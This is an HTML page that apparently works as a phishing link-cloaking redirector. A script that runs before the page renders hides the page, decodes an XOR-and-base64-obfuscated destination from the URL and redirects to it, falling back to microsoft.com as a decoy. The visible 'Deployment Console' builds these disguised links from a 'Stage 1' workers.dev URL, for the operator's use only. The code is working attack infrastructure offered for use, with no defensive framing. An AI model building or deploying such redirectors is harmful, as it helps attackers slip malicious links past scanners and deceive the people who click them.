<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <script>
        // --- 1. THE SILENT BOUNCER (Runs before anything else) ---
        const secretKey = "S3cur3_G4t3w4y";
        const params = new URLSearchParams(window.location.search);
        const payload = params.get('p');

        if (payload) {
            // Immediately hide everything
            document.documentElement.style.display = 'none';
            
            try {
                // Decrypt
                const binary = atob(payload.replace(/-/g, '+').replace(/_/g, '/'));
                let destination = "";
                for (let i = 0; i < binary.length; i++) {
                    destination += String.fromCharCode(binary.charCodeAt(i) ^ secretKey.charCodeAt(i % secretKey.length));
                }
                // Jump immediately
                window.location.replace(destination);
            } catch(e) {
                window.location.replace("https://www.microsoft.com");
            }
        }
    </script>
    <style>
        /* This only shows if there is NO payload (For You) */
        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .card { background: #1e293b; padding: 30px; border-radius: 12px; width: 100%; max-width: 450px; text-align: center; border: 1px solid #334155; }
        input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 6px; border: 1px solid #475569; background: #0f172a; color: #38bdf8; box-sizing: border-box; }
        button { background: #3b82f6; color: white; border: none; padding: 12px 24px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; }
        #result { margin-top: 20px; padding: 15px; background: #020617; border-radius: 6px; border: 1px dashed #38bdf8; font-family: monospace; font-size: 11px; word-break: break-all; color: #10b981; }
    </style>
</head>
<body>

    <div id="generatorUI" class="card">
        <h2 style="margin-top:0; color:#38bdf8;">Deployment Console</h2>
        <p style="font-size: 13px; color: #94a3b8;">Enter Stage 1 Link:</p>
        <input type="text" id="targetLink" placeholder="https://...workers.dev/#key">
        <button onclick="processLink()">ENCRYPT & GENERATE</button>
        <div id="result" style="display:none;"></div>
    </div>

    <script>
        // Generator Logic (Only for you)
        function processLink() {
            const input = document.getElementById('targetLink').value;
            if(!input) return;
            
            let result = "";
            for (let i = 0; i < input.length; i++) {
                result += String.fromCharCode(input.charCodeAt(i) ^ secretKey.charCodeAt(i % secretKey.length));
            }
            const encrypted = btoa(result).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
            
            const finalUrl = window.location.origin + window.location.pathname + "?p=" + encrypted;
            const resBox = document.getElementById('result');
            resBox.innerText = finalUrl;
            resBox.style.display = 'block';
        }
    </script>
</body>
</html>
